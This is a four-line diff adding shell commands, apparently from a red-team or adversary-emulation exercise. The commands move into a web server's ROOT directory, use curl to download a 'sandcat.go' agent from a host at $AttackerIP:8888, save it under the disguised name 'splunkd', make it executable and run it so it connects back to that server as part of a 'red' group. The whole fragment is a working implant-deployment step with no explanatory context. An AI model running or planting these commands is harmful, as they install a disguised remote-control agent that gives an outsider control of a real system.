@@ -1,0 +1,4 @@
+cd ../webapps/ROOT/
+curl -s -X POST -H "file:sandcat.go" -H "platform:linux" http://$AttackerIP:8888/file/download > splunkd;
+chmod +x splunkd;
+./splunkd -server http://$AttackerIP:8888 -group red -v;
